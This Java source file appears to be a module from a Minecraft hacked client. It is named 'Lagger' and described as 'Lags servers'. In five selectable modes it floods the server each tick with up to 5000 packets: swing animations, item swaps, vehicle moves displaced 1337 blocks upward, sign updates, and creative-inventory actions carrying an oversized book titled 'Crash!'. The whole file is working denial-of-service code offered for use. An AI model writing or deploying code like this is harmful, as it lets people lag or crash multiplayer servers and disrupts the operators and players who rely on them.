package me.memeszz.aurora.module.modules.misc;

import me.memeszz.aurora.event.events.UpdateEvent;
import me.memeszz.aurora.mixin.accessor.IMinecraft;
import me.memeszz.aurora.module.Module;
import me.memeszz.aurora.util.setting.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.tileentity.TileEntitySign;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

import java.util.ArrayList;

public class Lagger extends Module {
    public Lagger() {
        super("Lagger", Category.Misc, "Lags servers");
    }

    Setting.mode mode;
    Setting.i packets;

    public void setup() {
        ArrayList<String> modes = new ArrayList<>();
        modes.add("Boxer");
        modes.add("Swap");
        modes.add("Movement");
        modes.add("Sign");
        modes.add("Nbt");
        mode = this.registerMode("Mode","Mode", modes, "Boxer");
        packets = this.registerI("Packets","Packets",500, 0, 5000);
    }
    final Minecraft mc = Minecraft.getMinecraft();

    @Listener
    public void onUpdate(UpdateEvent event) {
            switch (mode.getValue()) {
                case "Boxer":
                    for (int i = 0; i <= packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                    }
                    break;
                case "Swap":
                    for (int i = 0; i <= packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
                    }
                    break;
                case "Movement":
                    for (int i = 0; i <= packets.getValue(); i++) {
                        final Entity riding = mc.player.getRidingEntity();
                        if (riding != null) {
                            riding.posX = mc.player.posX;
                            riding.posY = mc.player.posY + 1337;
                            riding.posZ = mc.player.posZ;
                            mc.player.connection.sendPacket(new CPacketVehicleMove(riding));
                        }
                    }
                    break;
                case "Sign":
                    for (TileEntity te : mc.world.loadedTileEntityList) {
                        if (te instanceof TileEntitySign) {
                            final TileEntitySign tileEntitySign = (TileEntitySign) te;

                            for (int i = 0; i <= packets.getValue(); i++) {
                                mc.player.connection.sendPacket(new CPacketUpdateSign(tileEntitySign.getPos(), new TextComponentString[]{new TextComponentString("give"), new TextComponentString("riga"), new TextComponentString("the"), new TextComponentString("green book")}));
                            }
                        }
                    }
                    break;
                case "Nbt":
                    final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList pages = new NBTTagList();

                    for (int page = 0; page < 50; page++) {
                        pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                    }

                    final NBTTagCompound tag = new NBTTagCompound();
                    tag.setString("author", ((IMinecraft) mc).getSession().getUsername());
                    tag.setString("title", "Crash!");
                    tag.setTag("pages", pages);
                    itemStack.setTagCompound(tag);

                    for (int i = 0; i <= packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
                        //mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                    }
                    break;
            }
        }
    }

